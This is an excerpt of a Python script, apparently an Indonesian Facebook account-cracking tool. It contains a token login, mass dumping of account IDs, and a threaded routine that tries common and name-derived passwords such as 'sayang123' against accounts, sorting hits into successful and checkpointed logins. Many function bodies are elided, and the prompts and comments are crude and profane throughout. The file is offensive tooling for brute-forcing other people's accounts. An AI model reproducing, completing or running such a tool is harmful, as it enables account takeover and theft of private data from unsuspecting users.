...
def banner():
	clear()
	wel = '# HELLO ANAK BABI ANAK HARAM ANAK ASUUUU!!!'
	wel2 = mark(wel, style='cyan')
	sol().print(wel2)
	au=' ░▐█▀█▒▐█▀▀▄░░▄█▀▄─░▐█▀█▒▐█▒▐▀  AUTHOR : NAZRI-XD \n ░▐█──▒▐█▒▐█░▐█▄▄▐█░▐█──▒▐██▌░  GITHUB: NAZRI-XD \n ░▐█▄█▒▐█▀▄▄░▐█─░▐█░▐█▄█▒▐█▒▐▄  FB: FACEBOOK GUA UNIK BANG'
...
def login():
		try:
			...
			try:
				...
				banner()
				li = '# Lu jangan Matiin Data Anying Tolol Bet'
...
def login_lagi():
	...
	try:
		...
		sue = '# LOGIN BERHASIL KALO CP JANGAN NGELUH AJG!'
		suu = mark(sue, style='green')
		sol().print(suu, style='cyan')
		time.sleep(2.5)
		menu()
	except KeyError:
		sue = '# Login Gagal Ajg, Token LU Bermasalah Atau Private'
...
def dump_massal():
	...
	try:
		jum = int(input(x+'['+p+'f'+x+'] Lu Mau Dump Berapa Ngentod: '))
	except ValueError:
...
def setting():
	...
	teks = '[01] Crack Dari Akun Tertua (GOOD)\n[02] Crack Dari Akun Termuda (AHH KURANG CROT)'
	...
	if aplik in ['y','Y']:
		...
		taplikasi.append('no')
	osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? [ KEMUNGKINAN LU GK ADA HASIL! ] (y/t) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
...
def passwrd():
	ler = '# JANGAN LUPA BERDOA AGAR HASILNYA CP AWOKAWOK BOONG LAH#'
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['sayang','sayangku','sayang123','NAZRINGANTENG','anjing','katasandi','sandi123']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s BISMILAH DULU %s/%s <-> IJO:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
